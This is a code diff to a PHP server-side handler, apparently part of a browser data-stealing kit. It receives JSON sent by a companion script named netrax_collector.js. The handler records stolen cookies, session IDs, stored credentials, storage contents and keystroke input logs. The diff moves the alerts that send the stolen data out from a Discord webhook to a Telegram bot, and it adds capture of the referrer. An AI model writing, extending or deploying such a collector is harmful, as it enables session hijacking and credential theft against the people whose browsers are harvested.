@@ -3,13 +3,13 @@
    cookie_handler.php  -- Cookie, Session ID & Stored Credential Capture
    ──────────────────────────────────────────────────────────────────
    Receives JSON payload from netrax_collector.js.
-   ONLY prints to terminal / saves / sends to Discord when
+   ONLY prints to terminal / saves / sends to Telegram when
    meaningful data is captured (real cookies, credentials, or storage).
    ════════════════════════════════════════════════════════════════════ */
 
-/* ── Discord Webhook Integration ────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ──────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
 }
 
 /* ── Headers ────────────────────────────────────────────────── */
@@ -77,6 +77,7 @@ $input_log            = cleanCookie($json_data['input_log']           ?? '');
 $indexeddb            = cleanCookie($json_data['indexeddb']            ?? '');
 $page_url             = cleanCookie($json_data['page_url']            ?? 'Unknown');
 $page_title           = cleanCookie($json_data['page_title']          ?? 'Unknown');
+$referrer_url         = cleanCookie($json_data['referrer']            ?? 'Direct / None');
 
 /* ── Hardware & Telemetry fields ──────────────────────────── */
 $screen_resolution    = cleanCookie($json_data['screen_resolution']   ?? '');
@@ -210,6 +211,7 @@ $record = [
     'user_agent'           => $user_agent,
     'page_url'             => $page_url,
     'page_title'           => $page_title,
+    'referrer'             => $referrer_url,
     'screen_resolution'    => $screen_resolution,
     'screen_viewport'      => $screen_viewport,
     'screen_pixel_ratio'   => $screen_pixel_ratio,
@@ -262,6 +264,7 @@ $txt_entry .= "Network Host    : " . nxLabel($reverse_host, 'Could not resolve (
 $txt_entry .= "User-Agent      : {$user_agent}\n";
 $txt_entry .= "Page            : {$page_title}\n";
 $txt_entry .= "URL             : {$page_url}\n";
+$txt_entry .= "Referrer        : " . nxLabel($referrer_url, 'Direct / None') . "\n";
 
 $txt_entry .= "{$subdiv}\n";
 $txt_entry .= "Screen Size     : " . nxLabel($screen_resolution) . "\n";
@@ -432,7 +435,7 @@ if ($has_input_log) {
 file_put_contents($data_dir . '/.flag_cookies', $terminal_output);
 
 /* ════════════════════════════════════════════════════════════
-   4. DISCORD WEBHOOK ALERT
+   4. TELEGRAM WEBHOOK ALERT
    ════════════════════════════════════════════════════════════ */
 $discord_net = nxLabel($connection_type);
 if (!empty($connection_effective) && strpos($discord_net, $connection_effective) === false && $connection_effective !== $connection_type) {
@@ -491,7 +494,7 @@ if ($has_input_log) {
     $discord_fields['⌨️ Input Log'] = (strlen($input_log) > 200) ? substr($input_log, 0, 200) . '…' : $input_log;
 }
 
-sendDiscordAlert('⚡ Device Telemetry & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);
+sendTelegramAlert('⚡ Device Telemetry & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);
 
 /* ── Success response ── */
 echo json_encode(['status' => 'success', 'message' => 'Data captured']);
